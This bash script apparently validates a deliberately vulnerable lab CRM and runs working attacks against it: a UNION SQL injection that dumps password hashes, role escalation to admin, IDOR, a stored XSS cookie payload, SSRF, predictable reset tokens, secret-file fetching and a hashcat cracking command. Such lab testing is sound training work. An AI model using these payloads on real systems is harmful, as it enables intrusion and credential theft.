#!/usr/bin/env bash
# prove_vulns.sh - exercises each Alliance CRM vulnerability and prints PASS/FAIL.
# Usage: bash tests/prove_vulns.sh http://TARGET:4000
# Requires: curl, jq. (python3 used for JWT decode if present.)
#
# NOTE: this is DESTRUCTIVE (escalates the 'intake' user, posts spam/intake rows,
# creates a reset-token row). Re-seed afterwards:
#     docker compose down -v && docker compose up -d
set -u

BASE="${1:-http://127.0.0.1:4000}"
pass=0; fail=0
ok()   { echo "  [PASS] $1"; pass=$((pass+1)); }
no()   { echo "  [FAIL] $1"; fail=$((fail+1)); }
hdr()  { echo; echo "=== $1 ==="; }

login() { # login <user> <pass> -> prints token
  curl -s -X POST "$BASE/api/auth/login" -H 'Content-Type: application/json' \
    -d "{\"username\":\"$1\",\"password\":\"$2\"}" | jq -r '.token // empty'
}

# ----------------------------------------------------------------------------
hdr "V1  A03 SQL injection (dump staff hashes)"
T=$(login volunteer volunteer)
PAYLOAD="%27%20UNION%20SELECT%20id%2C%20username%2C%20password_hash%2C%20role%2C%20%27%27%20FROM%20staff%20--%20"
ROWS=$(curl -s "$BASE/api/clients/search?q=$PAYLOAD" -H "Authorization: Bearer $T")
if echo "$ROWS" | jq -e '.rows[] | select(.full_name=="director" and (.email|test("^[0-9a-f]{32}$")))' >/dev/null 2>&1; then
  ok "staff username+MD5 hash leaked via UNION ($(echo "$ROWS" | jq -r '.rows[]|select(.full_name=="director")|.email'))"
else
  no "UNION injection did not return staff hashes"
fi

# ----------------------------------------------------------------------------
hdr "V2  A01 Privilege escalation (mass assignment role=admin)"
T=$(login intake Welcome1)
UID=$(curl -s -X POST "$BASE/api/auth/login" -H 'Content-Type: application/json' \
  -d '{"username":"intake","password":"Welcome1"}' | jq -r '.user.id')
BEFORE=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$BASE/api/users" \
  -H "Authorization: Bearer $T" -H 'Content-Type: application/json' \
  -d '{"username":"esctest_a","role":"volunteer","password":"x"}')
curl -s -X PATCH "$BASE/api/users/$UID" -H "Authorization: Bearer $T" \
  -H 'Content-Type: application/json' -d '{"role":"admin"}' >/dev/null
T=$(login intake Welcome1)   # new token now carries role=admin
AFTER=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$BASE/api/users" \
  -H "Authorization: Bearer $T" -H 'Content-Type: application/json' \
  -d '{"username":"esctest_b","role":"admin","password":"x"}')
echo "  create-staff before escalation: $BEFORE | after: $AFTER"
if [ "$BEFORE" = "403" ] && [ "$AFTER" = "201" ]; then
  ok "non-admin escalated to admin and can now manage staff"
else
  no "escalation did not flip 403 -> 201 (before=$BEFORE after=$AFTER)"
fi

# ----------------------------------------------------------------------------
hdr "V3  A01 IDOR (read a client not assigned to you)"
T=$(login peer Welcome1)
OWN=$(curl -s "$BASE/api/clients" -H "Authorization: Bearer $T" | jq '[.rows[].id]')
GOT=$(curl -s "$BASE/api/clients/1" -H "Authorization: Bearer $T")
echo "  peer's own client ids: $(echo "$OWN" | jq -c .)"
if echo "$OWN" | jq -e 'index(1)|not' >/dev/null 2>&1 && echo "$GOT" | jq -e '.id==1' >/dev/null 2>&1; then
  ok "client #1 (not assigned to peer) fully readable via /api/clients/:id"
else
  no "IDOR check inconclusive (client 1 may be assigned to peer; try another id)"
fi

# ----------------------------------------------------------------------------
hdr "V5  A03 Stored XSS (payload stored unsanitized)"
T=$(login peer Welcome1)
XSS='<img src=x onerror="alert(document.cookie)">'
curl -s -X POST "$BASE/api/clients/4/notes" -H "Authorization: Bearer $T" \
  -H 'Content-Type: application/json' -d "{\"body\":$(jq -Rn --arg b "$XSS" '$b')}" >/dev/null
BACK=$(curl -s "$BASE/api/clients/4/notes" -H "Authorization: Bearer $T" | jq -r '.rows[-1].body')
if [ "$BACK" = "$XSS" ]; then
  ok "note stored verbatim (renders via innerHTML -> executes in browser): $BACK"
else
  no "note body was altered on storage"
fi

# ----------------------------------------------------------------------------
hdr "V6  A04 Insecure design (unlimited intake + full export for read-only role)"
for i in $(seq 1 25); do
  curl -s -o /dev/null -X POST "$BASE/api/intake" -H 'Content-Type: application/json' \
    -d "{\"name\":\"flood $i\"}"
done
T=$(login volunteer volunteer)
EXP=$(curl -s "$BASE/api/export/clients" -H "Authorization: Bearer $T")
CN=$(echo "$EXP" | jq '.case_notes|length'); CL=$(echo "$EXP" | jq '.clients|length')
echo "  export as volunteer -> clients=$CL case_notes=$CN"
if [ "${CL:-0}" -ge 40 ] && [ "${CN:-0}" -ge 1 ]; then
  ok "read-only volunteer exported ALL clients + case notes, no cap"
else
  no "export did not return full dataset"
fi

# ----------------------------------------------------------------------------
hdr "V7  A05 Security misconfiguration"
curl -s "$BASE/.env" | grep -q 'JWT_SECRET' && ok "/.env is downloadable (secrets)" || no "/.env not exposed"
curl -s "$BASE/backup/" | grep -q 'alliance_crm_dump.sql' && ok "/backup/ directory listing + DB dump" || no "/backup listing missing"
curl -s "$BASE/debug" | grep -q 'jwt_secret' && ok "/debug leaks env + JWT secret" || no "/debug not exposing secrets"
H=$(curl -s -D - "$BASE/" -o /dev/null)
echo "$H" | grep -qi '^Server: Express' && ok "version banner present (Server header)" || no "no Server banner"
echo "$H" | grep -qi 'content-security-policy' && no "CSP present (unexpected)" || ok "no Content-Security-Policy header"
SC=$(curl -s -D - -X POST "$BASE/api/auth/login" -H 'Content-Type: application/json' \
  -d '{"username":"volunteer","password":"volunteer"}' -o /dev/null | grep -i '^set-cookie')
echo "$SC" | grep -qi 'httponly' && no "cookie has HttpOnly (unexpected)" || ok "auth cookie lacks HttpOnly: $(echo "$SC" | tr -d '\r')"

# ----------------------------------------------------------------------------
hdr "V8  A07 Authentication failures"
C_UNKNOWN=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$BASE/api/auth/login" \
  -H 'Content-Type: application/json' -d '{"username":"ghost","password":"x"}')
C_KNOWN=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$BASE/api/auth/login" \
  -H 'Content-Type: application/json' -d '{"username":"director","password":"x"}')
echo "  unknown-user status=$C_UNKNOWN  known-user-wrong-pw status=$C_KNOWN"
[ "$C_UNKNOWN" != "$C_KNOWN" ] && ok "user enumeration via differing login responses" || no "login responses identical"
TODAY=$(date -u +%F)
GUESS=$(printf '%s' "director:$TODAY" | md5sum | cut -d' ' -f1)
SERVER_TOK=$(curl -s -X POST "$BASE/api/auth/reset-request" -H 'Content-Type: application/json' \
  -d '{"username":"director"}' | jq -r '.reset_token // empty')
echo "  computed reset token=$GUESS  server token=$SERVER_TOK"
[ -n "$SERVER_TOK" ] && [ "$GUESS" = "$SERVER_TOK" ] && ok "reset token is predictable md5(user:date)" || no "reset token not predictable"
TOK=$(login volunteer volunteer)
if command -v python3 >/dev/null 2>&1; then
  NOEXP=$(python3 - "$TOK" <<'PY'
import sys,base64,json
p=sys.argv[1].split('.')[1]; p+='='*(-len(p)%4)
print('noexp' if 'exp' not in json.loads(base64.urlsafe_b64decode(p)) else 'hasexp')
PY
)
  [ "$NOEXP" = "noexp" ] && ok "JWT has no exp claim (never expires)" || no "JWT has exp"
else
  echo "  [SKIP] python3 not found - decode token manually to confirm no 'exp'"
fi

# ----------------------------------------------------------------------------
hdr "V10  A10 SSRF (server fetches internal URL)"
T=$(login volunteer volunteer)
SSRF=$(curl -s -X POST "$BASE/api/import/url" -H "Authorization: Bearer $T" \
  -H 'Content-Type: application/json' -d "{\"url\":\"$BASE/debug\"}")
if echo "$SSRF" | jq -e '.body | test("jwt_secret")' >/dev/null 2>&1; then
  ok "import endpoint fetched internal /debug and returned its body"
else
  no "SSRF did not return internal content"
fi

# ----------------------------------------------------------------------------
hdr "V9  A09 Logging failures (audit_log empty) - best effort via docker"
if command -v docker >/dev/null 2>&1 && docker ps --format '{{.Names}}' 2>/dev/null | grep -q alliance_crm_db; then
  N=$(docker exec alliance_crm_db psql -U alliance -d alliance_crm -t -A -c 'SELECT count(*) FROM audit_log;' 2>/dev/null)
  echo "  audit_log row count: ${N:-?}"
  [ "${N:-1}" = "0" ] && ok "no audit records despite all the activity above" || no "audit_log not empty"
else
  echo "  [SKIP] cannot reach db container; run manually:"
  echo "         docker exec alliance_crm_db psql -U alliance -d alliance_crm -c 'SELECT count(*) FROM audit_log;'"
fi

# ----------------------------------------------------------------------------
hdr "V4  A02 Cryptographic failures"
echo "  JWT secret via /debug: $(curl -s "$BASE/debug" | jq -r '.jwt_secret // "n/a"')"
echo "  Director hash (from V1): crack with ->  hashcat -m 0 -a 0 hashes.txt rockyou.txt   (= admin123)"
echo "  [MANUAL] confirm by cracking the MD5 and/or forging a token with the leaked secret."

echo
echo "================ SUMMARY: $pass passed, $fail failed (auto-checkable) ================"
echo "Re-seed to reset state:  docker compose down -v && docker compose up -d"
